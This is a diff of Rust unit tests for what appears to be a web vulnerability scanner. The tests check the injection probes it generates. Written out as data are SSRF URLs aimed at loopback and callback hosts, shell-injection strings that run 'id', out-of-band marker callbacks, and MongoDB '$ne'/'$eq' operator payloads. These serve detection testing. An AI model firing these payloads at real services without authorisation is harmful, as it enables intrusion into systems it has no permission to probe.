+        let callback = format!("{}.callback.satori.ci", "a".repeat(32));
+        let canary = Canary::new("run".to_owned())
+            .with_callback_host(Some(callback.clone()))
+            .with_marker_host(Some("0x7f000001:4321".to_owned()));
+        let attempts = attempts(
+            &probe(
+                VulnClass::Ssrf,
+                "/fetch",
+                Entry::Body(Some("url".to_owned())),
+            ),
+            &canary,
+            2,
+        );
+        assert_eq!(attempts.len(), 3);
+        assert!(
+            attempts[0]
+                .body
+                .as_deref()
+                .is_some_and(|body| body.contains("http://0x7f000001:4321/run-2"))
+        );
+        assert!(
+            attempts[1]
+                .body
+                .as_deref()
+                .is_some_and(|body| body.contains("http://lvh.me:4321/run-2"))
+        );
+        assert!(
+            attempts[2]
+                .body
+                .as_deref()
+                .is_some_and(|body| body.contains(&format!("https://{callback}/run-2")))
+        );
     }
 
     #[test]
@@ -2746,7 +3092,7 @@ mod tests {
     }
 
     #[test]
-    fn command_injection_uses_only_read_only_id_proofs() {
+    fn command_injection_uses_read_only_id_and_out_of_band_callback_proofs() {
         let canary = Canary::new("t".to_owned());
         let a = attempts(
             &probe(
@@ -2757,20 +3103,54 @@ mod tests {
             &canary,
             0,
         );
-        assert_eq!(
-            a[0].target,
-            "/run?host=x%3B%20id%20%3E%262%3B%20false%3B%20%23"
-        );
-        assert!(matches!(
-            &a[0].signal,
-            Signal::ResponseContains(expected) if expected == "uid="
-        ));
+        // Three separators (`;`, `|`, newline) each carry three oracles: `id >&2; false`, `id`, and a
+        // marker callback. Nothing destructive (`touch`, `rm`, `writeFile`) is ever sent.
+        assert_eq!(a.len(), 9);
         assert!(a.iter().all(|attempt| {
-            matches!(&attempt.signal, Signal::ResponseContains(expected) if expected == "uid=")
-                && attempt.target.contains("id")
-                && !attempt.target.contains("touch")
+            !attempt.target.contains("touch")
+                && !attempt.target.contains("rm%20")
+                && !attempt.target.to_lowercase().contains("writefile")
         }));
-        assert_eq!(a.len(), 6);
+        // The reflected proofs run `id` and look for `uid=` in the response.
+        let reflected: Vec<_> = a
+            .iter()
+            .filter(|attempt| {
+                matches!(&attempt.signal, Signal::ResponseContains(expected) if expected == "uid=")
+            })
+            .collect();
+        assert_eq!(reflected.len(), 6);
+        assert!(
+            reflected
+                .iter()
+                .all(|attempt| attempt.target.contains("id"))
+        );
+        // The blind proofs reach the marker service out of band carrying this probe's token.
+        let blind: Vec<_> = a
+            .iter()
+            .filter(|attempt| attempt.signal == Signal::ServiceReached(canary.service_token(0)))
+            .collect();
+        assert_eq!(blind.len(), 3);
+        assert!(
+            blind
+                .iter()
+                .all(|attempt| attempt.target.contains("jss-marker"))
+        );
+
+        let local =
+            Canary::new("t".to_owned()).with_marker_host(Some("0x7f000001:4321".to_owned()));
+        let raw = command_injection_payloads(
+            &probe(
+                VulnClass::CommandInjection,
+                "/run",
+                Entry::Query("host".to_owned()),
+            ),
+            &local,
+            0,
+        );
+        assert!(
+            raw.iter()
+                .any(|(payload, _)| { payload.contains("hostname:\"0x7f000001\",port:4321") })
+        );
     }
 
     #[test]
@@ -2885,8 +3265,8 @@ mod tests {
         assert_eq!(
             targets,
             [
-                format!("/{url}"),
                 url.clone(),
+                format!("/{url}"),
                 format!("//{MARKER_HOST}/{token}")
             ]
         );
@@ -2986,6 +3366,39 @@ mod tests {
     }
 
     #[test]
+    fn a_url_sourced_command_injection_rides_the_raw_query_string_under_the_gate() {
+        // A handler that reads the whole query string off the raw request URL
+        // (`req.url.split('?')[1]`) parses no named parameter, so the shell payload is the raw query
+        // string, under each gate path the handler dispatches on.
+        let canary = Canary::new("tok".to_owned());
+        let mut p = probe(VulnClass::CommandInjection, "/{wildcard}", Entry::Url);
+        p.gate_paths = vec!["/api/ids".to_owned()];
+        p.cmd_quote = Some('\'');
+
+        let a = attempts(&p, &canary, 1);
+        // A reflected `id` oracle rides the raw query under the gate, breaking out of the single quote.
+        assert!(
+            a.iter().any(|x| x.target == "/api/ids?'x;id;#"
+                && matches!(&x.signal, Signal::ResponseContains(e) if e == "uid=")),
+            "no raw-query command-injection attempt: {:?}",
+            a.iter().map(|x| &x.target).collect::<Vec<_>>()
+        );
+        // Every raw-query attempt under the gate is free of spaces and control characters, so an HTTP
+        // client sends it verbatim and the non-decoding handler sees the metacharacters intact.
+        let raw: Vec<&Attempt> = a
+            .iter()
+            .filter(|x| x.target.starts_with("/api/ids?"))
+            .collect();
+        assert!(!raw.is_empty());
+        assert!(
+            raw.iter()
+                .all(|x| x.target.bytes().all(|b| (0x21..=0x7e).contains(&b))),
+            "a raw-query attempt carried a space/control character: {:?}",
+            raw.iter().map(|x| &x.target).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
     fn a_url_sourced_traversal_probes_each_query_param_under_the_gate_with_an_image_canary() {
         // The request URL is parsed and the file path is read from a query parameter of it, so the
         // climbing payload must ride that parameter under the gate path, not the request path.
@@ -3033,6 +3446,30 @@ mod tests {
     }
 
     #[test]
+    fn a_fixed_suffix_read_oracle_climbs_to_the_tmp_canary_directory() {
+        let canary = Canary::new("tok".to_owned());
+        let mut p = probe(
+            VulnClass::PathTraversal,
+            "/debug/{sessionId}",
+            Entry::PathParam("sessionId".to_owned()),
+        );
+        p.read_suffix = Some("session.json".to_owned());
+
+        let oracles = read_oracle(&p, &canary, 1);
+        assert!(!oracles.is_empty());
+        assert!(
+            oracles
+                .iter()
+                .all(|oracle| oracle.present_value.ends_with("tmp/jss-canary-read.d")),
+            "fixed-suffix oracle did not target the planted /tmp directory: {:?}",
+            oracles
+                .iter()
+                .map(|oracle| &oracle.present_value)
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
     fn canary_is_planted_under_the_gz_precompressed_suffix() {
         // A precompressed-asset handler serves `<name>.gz` when the client asks for the bare
         // `<name>` (`express-static-gzip`, webpack `.gz` emits). The read oracles request the bare
@@ -3041,12 +3478,12 @@ mod tests {
         let canary = Canary::new("abc123".to_owned());
         let planted = canary.planted_files();
         assert!(
-            planted.iter().any(|p| p == "/jss-canary-read.gz"),
+            planted.iter().any(|p| p == "/tmp/jss-canary-read.gz"),
             "{planted:?}"
         );
         // The bare-name read is still planted, so a handler that does not append a suffix is covered.
         assert!(
-            planted.iter().any(|p| p == "/jss-canary-read"),
+            planted.iter().any(|p| p == "/tmp/jss-canary-read"),
             "{planted:?}"
         );
     }
@@ -3089,12 +3526,105 @@ mod tests {
         let absent2 = nosql_absent_token(&canary, 2);
         let targeted = nosql_cases(&targeted, &canary, 2);
         assert_eq!(targeted[0].field, "email");
+        // The generic `name` filler is replaced by this case's per-probe-unique numeric identity (so a
+        // write handler's unique-key insert does not collide across the three probes); the constrained
+        // `password` filler is kept verbatim. The three probes use distinct identities.
+        let identity = &targeted[0].identity;
+        assert_eq!(identity.len(), 3);
         assert_eq!(
             targeted[0].match_all.body.as_deref(),
             Some(
-                format!("{{\"email\":{{\"$ne\":\"{absent2}\"}},\"name\":\"jsspector\",\"password\":\"Valid1!x\"}}")
-                    .as_str()
+                format!(
+                    "{{\"email\":{{\"$ne\":\"{absent2}\"}},\"name\":{},\"password\":\"Valid1!x\"}}",
+                    identity[0]
+                )
+                .as_str()
             )
+        );
+        assert_eq!(
+            targeted[0].match_none_eq.body.as_deref(),
+            Some(
+                format!(
+                    "{{\"email\":{{\"$eq\":\"{absent2}\"}},\"name\":{},\"password\":\"Valid1!x\"}}",
+                    identity[1]
+                )
+                .as_str()
+            )
+        );
+        assert_ne!(identity[0], identity[1]);
+    }
+
+    #[test]
+    fn a_document_filtering_sink_keeps_its_siblings_a_constant_string_across_probes() {
+        // For a `findOne({ email, code })`-style sink the sibling `email` is ANDed into the query and
+        // must match a planted record, so it has to be the same string on the match-all and both
+        // match-none probes — never a per-probe-unique number (which would also crash a handler that
+        // calls `email.toLowerCase()`). The injected `code` field still carries the operators.
+        let canary = Canary::new("abc123".to_owned());
+        let mut p = probe(
+            VulnClass::NosqlInjection,
+            "/api/user/verifymail",
+            Entry::Body(Some("code".to_owned())),
+        );
+        p.nosql_lookup = true;
+        p.siblings = vec![("email".to_owned(), ENVELOPE_PLACEHOLDER.to_owned())];
+        let absent = nosql_absent_token(&canary, 3);
+        let cases = nosql_cases(&p, &canary, 3);
+        let code = cases.iter().find(|case| case.field == "code").unwrap();
+        assert_eq!(
+            code.match_all.body.as_deref(),
+            Some(
+                format!(
+                    "{{\"code\":{{\"$ne\":\"{absent}\"}},\"email\":\"{ENVELOPE_PLACEHOLDER}\"}}"
+                )
+                .as_str()
+            )
+        );
+        assert_eq!(
+            code.match_none_eq.body.as_deref(),
+            Some(
+                format!(
+                    "{{\"code\":{{\"$eq\":\"{absent}\"}},\"email\":\"{ENVELOPE_PLACEHOLDER}\"}}"
+                )
+                .as_str()
+            )
+        );
+        // The injected field name is distinct from the sentinel the controls carry.
+        assert!(code.match_all.body.as_deref().unwrap().contains("$ne"));
+    }
+
+    #[test]
+    fn a_registration_lookup_gives_each_probe_a_unique_string_identity() {
+        let canary = Canary::new("abc123".to_owned());
+        let mut p = probe(
+            VulnClass::NosqlInjection,
+            "/api/auth/register",
+            Entry::Body(Some("referralCode".to_owned())),
+        );
+        p.nosql_lookup = true;
+        p.nosql_inserts_before_sink = true;
+        p.siblings = vec![
+            ("username".to_owned(), "jsspector".to_owned()),
+            ("role".to_owned(), "jsspector".to_owned()),
+        ];
+
+        let cases = nosql_cases(&p, &canary, 7);
+        let referral = cases
+            .iter()
+            .find(|case| case.field == "referralCode")
+            .unwrap();
+        let all = referral.match_all.body.as_deref().unwrap();
+        let none = referral.match_none_eq.body.as_deref().unwrap();
+        assert!(all.contains("\"username\":\"jsspector-"), "{all}");
+        assert!(none.contains("\"username\":\"jsspector-"), "{none}");
+        assert_ne!(all, none);
+        assert!(all.contains("\"role\":\"jsspector\""), "{all}");
+        assert!(none.contains("\"role\":\"jsspector\""), "{none}");
+        assert!(
+            referral
+                .identity
+                .iter()
+                .all(|value| value.starts_with("jsspector-"))
         );
     }
 
@@ -3190,11 +3720,15 @@ mod tests {
         );
         // Other probed field names keep the direct (non-array) operator form.
         let other = cases.iter().find(|c| c.field == "id").unwrap();
+        // The generic `device_names` placeholder sibling takes this case's per-probe numeric identity.
         assert_eq!(
             other.match_all.body.as_deref(),
             Some(
-                format!("{{\"id\":{{\"$ne\":\"{absent}\"}},\"device_names\":\"jsspector\"}}")
-                    .as_str()
+                format!(
+                    "{{\"id\":{{\"$ne\":\"{absent}\"}},\"device_names\":{}}}",
+                    other.identity[0]
+                )
+                .as_str()
             )
         );
     }
